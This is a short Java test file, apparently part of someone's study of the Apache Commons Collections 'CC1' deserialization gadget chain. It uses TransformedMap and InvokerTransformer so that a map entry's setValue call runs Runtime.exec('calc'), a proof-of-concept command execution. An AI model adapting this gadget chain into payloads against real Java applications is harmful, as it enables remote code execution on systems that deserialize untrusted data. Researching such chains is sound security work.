package com.drose.CC1;

import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.util.HashMap;
import java.util.Map;

public class SetValueTest {
    public static void main(String[] args) {
        InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
        Runtime runtime = Runtime.getRuntime();
        HashMap<Object,Object> hashMap=new HashMap<>();
        hashMap.put("1","2");
        Map<Object, Object> decorateMap = TransformedMap.decorate(hashMap, null, invokerTransformer);
        for (Map.Entry entry:decorateMap.entrySet()){
            entry.setValue(runtime);
        }
    }
}
